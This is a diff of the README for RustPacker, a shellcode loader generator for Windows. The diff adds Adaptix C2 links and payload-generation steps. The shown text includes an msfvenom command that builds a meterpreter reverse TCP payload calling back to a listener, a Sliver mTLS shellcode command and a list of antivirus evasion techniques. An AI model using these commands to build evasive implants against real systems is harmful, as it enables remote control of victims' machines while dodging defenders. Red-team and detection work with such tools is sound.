@@ -15,7 +15,7 @@
 
 ### What is RustPacker?
 
-**Shellcode** is a small blob of machine code that a C2 framework (Metasploit, Sliver, Cobalt Strike…) generates as a payload. By itself it's just bytes — it needs a *loader* to run it on a target Windows machine.
+**Shellcode** is a small blob of machine code that a C2 framework ([Metasploit](https://github.com/rapid7/metasploit-framework), [Sliver](https://github.com/BishopFox/sliver), [Adaptix C2](https://github.com/Adaptix-Framework/AdaptixC2), Cobalt Strike…) generates as a payload. By itself it's just bytes — it needs a *loader* to run it on a target Windows machine.
 
 **RustPacker is that loader generator.** It takes your shellcode and wraps it in a Rust program.
 
@@ -306,17 +306,31 @@ Optional:
 
 **Important:** Always save your shellcode files in the `shared/` directory of the RustPacker project. This directory is the only one mounted inside the container.
 
-**Metasploit (msfvenom):**
+**Metasploit ([msfvenom](https://github.com/rapid7/metasploit-framework)):**
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f raw -o shared/payload.raw
 ```
 
-**Sliver:**
+**[Sliver](https://github.com/BishopFox/sliver):**
 ```bash
 # In Sliver console
 generate --mtls 192.168.1.100:443 --format shellcode --os windows
 # Then copy the generated .bin file to the shared/ folder
 ```
+
+**Adaptix C2:**
+
+[Adaptix C2](https://github.com/Adaptix-Framework/AdaptixC2) generates payloads from its GUI client (no CLI):
+
+1. In the Adaptix client, open the **Payloads** tab and click **Generate Payload**
+2. Select your listener (e.g., HTTPS), set **OS** to `Windows` and **Arch** to `x64`
+3. Set **Format** to `Shellcode (.bin)` — this produces the raw shellcode RustPacker expects
+4. Copy the generated `.bin` file to the `shared/` folder:
+```bash
+cp ~/path/to/adaptix_payload.bin shared/
+```
+
+> **Note:** Adaptix agents are self-contained (stageless). Once packed, the resulting binary embeds the whole agent — expect a larger payload than a staged Sliver/Metasploit shellcode.
 
 ### Packing Examples
 
@@ -395,7 +409,7 @@ RustPacker implements several evasion techniques:
 - **Template Variety**: Multiple execution methods to avoid static signatures
 - **Rust Compilation**: Native binaries with stripped symbols and LTO
 
-> ⚠️ **Breaking Change**: Since RWX (PAGE_EXECUTE_READWRITE) is no longer used, **self-modifying / dynamic shellcode is not supported**. Only static shellcode payloads are compatible. Most C2 frameworks (Metasploit, Sliver, Cobalt Strike, Havoc) generate static shellcode by default — this should not affect typical usage.
+> ⚠️ **Breaking Change**: Since RWX (PAGE_EXECUTE_READWRITE) is no longer used, **self-modifying / dynamic shellcode is not supported**. Only static shellcode payloads are compatible. Most C2 frameworks (Metasploit, Sliver, Adaptix C2, Cobalt Strike, Havoc) generate static shellcode by default — this should not affect typical usage.
 
 ### ⚠️ Call Stack Spoofing Limitations
 
